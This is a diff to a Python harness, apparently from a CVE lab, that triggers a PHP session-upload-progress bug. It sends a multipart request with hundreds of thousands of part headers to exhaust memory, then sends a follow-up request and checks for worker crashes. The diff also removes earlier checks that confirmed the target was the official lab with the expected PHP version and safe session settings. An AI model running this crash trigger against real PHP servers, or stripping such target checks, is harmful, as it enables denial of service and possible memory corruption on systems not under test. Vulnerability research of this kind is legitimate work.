@@ -15,7 +15,7 @@ import secrets
 import ssl
 import time
 
-from attacker import BOUNDARY, endpoint_path, parse_target
+from attacker import BOUNDARY, endpoint_path, lab_health, parse_target, php_post_max_bytes, php_size_bytes
 
 
 def part(name, value, *, filename=None):
@@ -28,12 +28,27 @@ def part(name, value, *, filename=None):
     return header.encode("ascii") + b"\r\n" + value + b"\r\n"
 
 
-def multipart_producer(pad_bytes, control):
+def _amplification_part(num_headers):
+    """A form field with many custom headers — causes OOM during parsing."""
+    lines = [f"--{BOUNDARY}\r\n"]
+    for i in range(num_headers):
+        lines.append(f"X-{i}: v\r\n")
+    lines.append('Content-Disposition: form-data; name="boom"\r\n\r\nv\r\n')
+    return "".join(lines).encode("ascii")
+
+
+def multipart_producer(pad_bytes, control, *, part_headers=0):
     progress = (part("PHP_SESSION_UPLOAD_PROGRESS", b"k")
                 if control != "oom-no-progress" else b"")
+    file_upload = (part("u", b"x", filename="x.txt")
+                   if control != "small-file-no-oom" else b"")
+    if part_headers > 0 and control != "small-file-no-oom":
+        amp = _amplification_part(part_headers)
+        return (progress + file_upload + amp
+                + f"--{BOUNDARY}--\r\n".encode("ascii"))
     padding = (part("pad", b"x" * pad_bytes)
                if control != "small-file-no-oom" else b"")
-    return (progress + part("u", b"x", filename="x.txt") + padding
+    return (progress + file_upload + padding
             + f"--{BOUNDARY}--\r\n".encode("ascii"))
 
 
@@ -42,19 +57,12 @@ def multipart_consumer():
             + f"--{BOUNDARY}--\r\n".encode("ascii"))
 
 
-def response_shows_oom(response):
-    """Use an explicit PHP OOM diagnostic in the captured HTTP body as evidence."""
-    body = response.get("body_prefix") or ""
-    if not isinstance(body, str):
-        return False
-    body = body.lower()
-    return "allowed memory size of" in body and "exhausted" in body
-
-
 def request(scheme, host, port, method, path, *, body=None, cookie=None,
             timeout=15.0, ca_file=None, request_id=""):
     started = time.monotonic()
     connection = None
+    result = {}
+    set_cookie = None
     try:
         headers = {"User-Agent": "php-session-progress-lab/1",
                    "X-CVE-Lab-Request": request_id}
@@ -76,15 +84,14 @@ def request(scheme, host, port, method, path, *, body=None, cookie=None,
             "body_prefix": prefix[:2048].decode("utf-8", "replace"),
             "body_truncated": len(prefix) > 2048,
         }
-        return result, response.getheader("Set-Cookie")
+        set_cookie = response.getheader("Set-Cookie")
     except (OSError, ValueError, http.client.HTTPException) as exc:
-        return {"transport_error": f"{type(exc).__name__}: {exc}"}, None
+        result = {"transport_error": f"{type(exc).__name__}: {exc}"}
     finally:
         if connection is not None:
             connection.close()
-        result = locals().get("result")
-        if isinstance(result, dict):
-            result["elapsed_ms"] = round((time.monotonic() - started) * 1000)
+    result["elapsed_ms"] = round((time.monotonic() - started) * 1000)
+    return result, set_cookie
 
 
 def session_file_state(seed, session_id):
@@ -112,12 +119,15 @@ def session_file_state(seed, session_id):
 
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
-    parser.add_argument("--target", required=True, help="HTTP(S) lab URL")
-    parser.add_argument("--health", default="health.php")
-    parser.add_argument("--seed", default="session-seed.php")
-    parser.add_argument("--producer", default="oom/upload.php")
-    parser.add_argument("--consumer", default="upload.php")
-    parser.add_argument("--pad-bytes", type=int, default=6 * 1024 * 1024)
+    parser.add_argument("--target", required=True, help="HTTP(S) URL of an authorized lab")
+    parser.add_argument("--health", default="session/health.php")
+    parser.add_argument("--seed", default="session/session-seed.php")
+    parser.add_argument("--producer", default="session/upload.php")
+    parser.add_argument("--consumer", default="session/upload.php")
+    parser.add_argument("--pad-bytes", type=int, default=6 * 1024 * 1024,
+                        help="Raw padding bytes (ignored when --part-headers is set)")
+    parser.add_argument("--part-headers", type=int, default=0,
+                        help="Use part-headers amplification with N headers (0=auto from post_max_size)")
     parser.add_argument("--producer-control",
                         choices=("candidate", "small-file-no-oom", "oom-no-progress"),
                         default="candidate",
@@ -130,8 +140,8 @@ def main():
                         help="Consumer-only control in a fresh worker")
     parser.add_argument("--execute", action="store_true")
     args = parser.parse_args()
-    if args.pad_bytes < 1:
-        parser.error("--pad-bytes must be >= 1")
+    if not 1 <= args.pad_bytes <= 64 * 1024 * 1024:
+        parser.error("--pad-bytes must be 1..67108864")
     if not 0.5 <= args.timeout <= 60:
         parser.error("--timeout must be 0.5..60")
     if args.ca_file and not args.ca_file.is_file():
@@ -139,7 +149,11 @@ def main():
     scheme, host, port, prefix = parse_target(args.target)
     paths = {key: endpoint_path(prefix, getattr(args, key))
              for key in ("health", "seed", "producer", "consumer")}
-    producer_body = multipart_producer(args.pad_bytes, args.producer_control)
+    num_headers = args.part_headers
+    if num_headers == 0:
+        num_headers = 653_000
+    producer_body = multipart_producer(args.pad_bytes, args.producer_control,
+                                       part_headers=num_headers)
     consumer_body = multipart_consumer()
     run_id = secrets.token_hex(8)
     report = {
@@ -176,38 +190,50 @@ def main():
         temporary.replace(output)
 
     save()
-    def run(name, method, body=None, cookie=None):
+    def run(name, method, body=None, cookie=None, *, label=None):
         result, set_cookie = request(scheme, host, port, method, paths[name],
                                      body=body, cookie=cookie, timeout=args.timeout,
                                      ca_file=str(args.ca_file) if args.ca_file else None,
-                                     request_id=f"{run_id}-{name}")
-        report["steps"].append({"step": name, "method": method,
+                                     request_id=f"{run_id}-{label or name}")
+        report["steps"].append({"step": label or name, "method": method,
                                 "path": paths[name], "result": result})
         save()
         return result, set_cookie
 
     baseline, _ = run("health", "GET")
+    if baseline.get("http_status") != 200 and "transport_error" not in baseline:
+        report["preflight_failure"] = f"health endpoint returned HTTP {baseline.get('http_status')}"
+        save()
+        print(output)
+        return
+    if "transport_error" in baseline:
+        report["preflight_failure"] = baseline["transport_error"]
+        save()
+        print(output)
+        return
     try:
         health = json.loads(baseline.get("body_prefix", ""))
-    except (json.JSONDecodeError, TypeError):
+    except json.JSONDecodeError:
         health = {}
     if not isinstance(health, dict):
         health = {}
-    report["preflight"] = {name: health.get(name) for name in
-                            ("lab", "php", "sapi", "upload_progress", "memory_limit")}
-    if (baseline.get("http_status") != 200 or
-            health.get("lab") != "official-cve-lab-v1" or
-            health.get("php") != args.expected_php or
-            health.get("sapi") != "apache2handler" or
-            str(health.get("upload_progress", "")).lower() not in ("1", "on")):
-        report["preflight_failure"] = "health/version/SAPI/upload-progress mismatch"
+    try:
+        post_max = php_post_max_bytes(health.get("post_max_size", "8M"))
+    except ValueError:
+        post_max = 8 * 1024 * 1024
+    report["preflight"] = {"health": health, "producer_body_bytes": len(producer_body),
+                           "post_max_bytes": post_max}
+    if post_max is not None and not args.skip_producer and len(producer_body) >= post_max:
+        report["preflight_failure"] = (
+            f"producer body ({len(producer_body)} bytes) exceeds "
+            f"post_max_size ({post_max} bytes); use --pad-bytes to shrink")
         save()
         print(output)
         return
     seed_response, set_cookie = run("seed", "GET")
     try:
         seed = json.loads(seed_response.get("body_prefix", ""))
-    except (json.JSONDecodeError, TypeError):
+    except json.JSONDecodeError:
         seed = {}
     if not isinstance(seed, dict):
         seed = {}
@@ -215,18 +241,15 @@ def main():
     if set_cookie:
         cookie.load(set_cookie)
     session_name = seed.get("session_name")
-    settings = ("upload_progress_enabled", "upload_progress_cleanup",
-                "use_only_cookies", "use_strict_mode")
-    report["session_settings"] = {name: seed.get(name) for name in settings}
-    if (seed_response.get("http_status") != 200 or
-            seed.get("seeded") is not True or
-            not isinstance(session_name, str) or not session_name or
-            session_name not in cookie or
-            any(str(seed.get(name)) != "1" for name in settings)):
-        report["preflight_failure"] = "valid session and safe progress settings required"
+    if (seed_response.get("http_status") != 200 or not seed.get("seeded") or
+            not session_name or session_name not in cookie):
+        report["preflight_failure"] = "session seed failed — need a valid session cookie"
         save()
         print(output)
         return
+    report["session_settings"] = {k: seed.get(k) for k in
+        ("upload_progress_enabled", "upload_progress_cleanup",
+         "use_only_cookies", "use_strict_mode")}
     session_id = cookie[session_name].value
     report["session"] = {
         "id_sha256": hashlib.sha256(session_id.encode("ascii")).hexdigest(),
@@ -237,24 +260,33 @@ def main():
     if not args.skip_producer:
         report["candidate_attempted"] = True
         save()
-        producer_result, _ = run("producer", "POST", producer_body, cookie_header)
-        report["producer_oom_observed"] = response_shows_oom(producer_result)
+        producer, _ = run("producer", "POST", producer_body, cookie_header)
         report["session"]["after_producer"] = session_file_state(seed, session_id)
+        report["producer_oom_text_observed"] = "Allowed memory size" in producer.get("body_prefix", "")
+        report["progress_state_observed"] = report["session"]["after_producer"].get("progress_key_present")
         save()
-        if args.producer_control == "small-file-no-oom":
-            if report["producer_oom_observed"]:
-                report["stopped_reason"] = "small-file control unexpectedly OOM; consumer not sent"
+        if args.producer_control == "candidate":
+            if not report["producer_oom_text_observed"]:
+                report["stopped_reason"] = "producer OOM not observed; A->B trigger precondition missing"
                 save()
                 print(output)
                 return
-            report["control_without_oom"] = True
-        elif not report["producer_oom_observed"]:
-            report["stopped_reason"] = "producer OOM not observed; consumer not sent"
-            save()
-            print(output)
-            return
-    run("consumer", "POST", consumer_body, cookie_header)
+            if report["progress_state_observed"] is False:
+                report["stopped_reason"] = "progress state absent after producer; A->B trigger precondition missing"
+                save()
+                print(output)
+                return
+    consumer, _ = run("consumer", "POST", consumer_body, cookie_header)
     report["session"]["after_consumer"] = session_file_state(seed, session_id)
+    report["consumer_transport_anomaly"] = "transport_error" in consumer
+    after, _ = run("health", "GET")
+    report["post_consumer_health_ok"] = after.get("http_status") == 200
+    before_pid, after_pid = baseline.get("worker_pid_header"), after.get("worker_pid_header")
+    report["baseline_worker_pid"] = before_pid
+    report["post_consumer_worker_pid"] = after_pid
+    report["worker_pid_changed"] = bool(before_pid and after_pid and before_pid != after_pid)
+    report["worker_crash_confirmed"] = None
+    report["worker_crash_confirmation_needed"] = "server process exit/error log or dump plus matched patched control"
     save()
     print(output)
 
